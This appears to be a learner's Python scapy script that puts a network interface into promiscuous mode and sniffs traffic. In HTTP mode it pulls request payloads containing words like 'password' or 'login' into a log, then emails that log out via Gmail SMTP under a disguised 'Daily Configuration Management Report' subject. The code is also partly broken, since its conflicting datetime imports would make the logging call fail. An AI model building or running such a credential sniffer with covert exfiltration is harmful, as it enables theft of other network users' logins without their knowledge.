import logging
from datetime import datetime
import subprocess
import sys
import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

try:
    from scapy.all import *
    from scapy.layers import http

except ImportError:
    print("""Scapy Package fro Python is not installed on your system :
        try to install it from https://scapy.net/ """)
    sys.exit()

print("\nWelocme to Scapy app, please make sure that you run this script as root (\"_\") \n")

cmd = "ifconfig -a | grep UP | sed 's/:.*//;/^$/d'"

ifconfig = subprocess.Popen(
    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

output = ifconfig.communicate()

aList = list(output)
index = aList[0]

interfaceInString = index.decode("utf-8")
inetfInSplitList = interfaceInString.split("\n")
print('\n'.join(['{}  ->  {}'.format(i, val)
      for i, val in (enumerate(inetfInSplitList, start=1))]))
print("\nThose all the active interface in your system.  \n")

while True:
    try:
        net_iface = input("Select Interface from the list: ")
        if (net_iface in inetfInSplitList):
            print("Interface[ %s ] Exists" % net_iface)
            break
        else:
            print("Interface[ %s ] Not Exists" % net_iface)
    except:
        continue
print("\n[+] The Interface You have selected is:", net_iface)

try:
    subprocess.call(["ifconfig", net_iface, "promisc"],
                    stdout=None, stderr=None, shell=False)

except:
    print("\nFailed to configure interface as promisoucus.\n")

else:
    print("Interface %s was set to PROMISC mode. \n" % net_iface)


while True:
    try:
        pkt_to_sniff = int(input(
            "* Enter the number of packets to capture ( 0 is infinity): "))
        break
    except ValueError:
        print("Please input integer only...")
        continue

if int(pkt_to_sniff) != 0:
    print("\nThe program will caputer %d packets. \n" % int(pkt_to_sniff))
elif int(pkt_to_sniff) == 0:
    print("\nThe program will caputer packets until the timeout expires. \n")

while True:
    try:
        time_to_sniff = int(
            input("* Enter the number of second to run the caputer: "))
        if int(time_to_sniff) != 0:
            print("\nThe program will caputer packets fro %d seconds.\n" %
                  int(time_to_sniff))
        break
    except ValueError:
        print("Please input integer only...")
        continue

options = ["arp", "icmp", "bootP", "0", "http"]
while True:
    try:
        proto_sniff = input(
            "\nEnter the protocol name you want to filetr by[ ARP| ICMP| BOOTP | http or 0 is for all]: ").lower()
        if (proto_sniff in options):
            print("protocols found ")
            break
        else:
            print("protocol not found")
    except:
        continue

if (proto_sniff == "arp") or (proto_sniff == "icmp") or (proto_sniff == "bootp"):
    print("\nThe program will captureonly %s packets.\n" % proto_sniff.upper())
elif (proto_sniff) == "0":
    print("\nThe progam will capture all protocols. \n")

file_name = input("Pleas give a name to the log file: ")

sniff_log = open(file_name, "a")


def paket_log(packet):
    now = datetime.now()

    if proto_sniff == "http":
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(Raw):  # tthe password stored in the raw field
                load = str(packet[Raw].load)
                keyword = ['usernmae', 'user', 'login', 'password', 'pass']
                for key in keyword:
                    if key in load:
                        print('\nHere you will find the userName and the Password:\n\n-___ ' +
                              str(load)+'_--', file=sniff_log)
                        break

    elif (proto_sniff == "arp") or (proto_sniff == "icmp") or (proto_sniff == "bootp"):
        print("Time: " + str(now) + "Protocol: " + proto_sniff.upper() + " The Source MAC: " +
              packet[0].src + " The Destination MAC: " + packet[0].dst, file=sniff_log)

    else:
        print("Time: " + str(now) + "All protocols: " + " The Source MAC is: " +
              packet[0].src + " The Destination MAC is:" + packet[0].dst, file=sniff_log)


print("\nStarting the capturing......")
if proto_sniff == "0" or proto_sniff == "http":
    sniff(iface=net_iface, count=int(pkt_to_sniff),
          timeout=int(time_to_sniff), prn=paket_log)
    print("Done Capturing all protocols.")

elif (proto_sniff == "arp") or (proto_sniff == "icmp") or (proto_sniff == "bootp"):
    sniff(iface=net_iface, filter=proto_sniff, count=int(
        pkt_to_sniff), timeout=int(time_to_sniff), prn=paket_log)
    print("Done Capturing %s protocol." % proto_sniff)

else:
    print("\nCould not identify the protocol :( .... ")
    sys.exit()

print("\nPlease check the file %s file to see the captured packets.\n" % file_name)

sniff_log.close()

captureFile = '/Users/l0c0/Documents/learningPython/pyStudyingFiles/codePy/netSniffer/'+file_name
with open(captureFile, 'r') as emailFile:
    emailFileToSend = emailFile.read()

fromaddr = 'sender@gmail.com'
toaddr = 'reciver@gmail.com'

msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = 'Daily Configuration Management Report'
msg.attach(MIMEText(emailFileToSend, 'html'))

server = smtplib.SMTP('smtp.gmail.com', 587)

server.starttls()

server.login('senderEmail', 'senderEmailPass')
server.sendmail(fromaddr, toaddr, msg.as_string())
server.quit()
print("\nPlease check Your Email %s to see the captured packets.\n" % toaddr)
